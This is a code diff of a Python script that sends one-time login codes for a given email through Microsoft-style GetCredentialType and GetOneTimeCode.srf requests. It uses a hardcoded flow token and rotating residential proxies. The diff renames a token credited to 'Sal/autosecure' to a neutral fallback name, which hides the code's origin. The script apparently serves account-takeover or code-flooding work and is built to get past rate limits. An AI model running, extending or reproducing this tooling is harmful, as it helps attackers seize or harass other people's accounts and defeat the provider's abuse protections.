@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-OTP send — Sal/autosecure GetOneTimeCode flow + residential sticky proxies.
+OTP send — GetCredentialType + GetOneTimeCode.srf + residential sticky proxies.
 
 Usage:
   python send_ott.py email@example.com
@@ -22,8 +22,8 @@ except ImportError:
 
 from proxy_pool import load_proxies, mark_bad, next_proxy, proxy_label
 
-# Sal autosecure hardcodes this flowToken for GetCredentialType
-SAL_FLOW_TOKEN = (
+# Fallback flowToken for GetCredentialType when live PPFT fails
+FALLBACK_FLOW_TOKEN = (
     "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!"
     "Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvob"
     "IOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$"
@@ -198,8 +198,8 @@ def attempt_once(email: str, proxy_url: str | None) -> dict:
                         "proxy": label,
                     }
 
-            flow_candidates = [SAL_FLOW_TOKEN]
-            if live_ppft and live_ppft != SAL_FLOW_TOKEN:
+            flow_candidates = [FALLBACK_FLOW_TOKEN]
+            if live_ppft and live_ppft != FALLBACK_FLOW_TOKEN:
                 flow_candidates.append(live_ppft)
 
             email_info = None
@@ -257,12 +257,12 @@ def attempt_once(email: str, proxy_url: str | None) -> dict:
                 live2 = get_live_data(session)
                 flowtoken = live2["ppft"]
             except Exception:
-                flowtoken = live_ppft or SAL_FLOW_TOKEN
+                flowtoken = live_ppft or FALLBACK_FLOW_TOKEN
 
             otc = post_one_time_code(session, email, flowtoken, alt_email_e, security_mail)
-            if not otc.get("ok") and flowtoken != SAL_FLOW_TOKEN:
+            if not otc.get("ok") and flowtoken != FALLBACK_FLOW_TOKEN:
                 otc = post_one_time_code(
-                    session, email, SAL_FLOW_TOKEN, alt_email_e, security_mail
+                    session, email, FALLBACK_FLOW_TOKEN, alt_email_e, security_mail
                 )
 
             if otc.get("ok"):
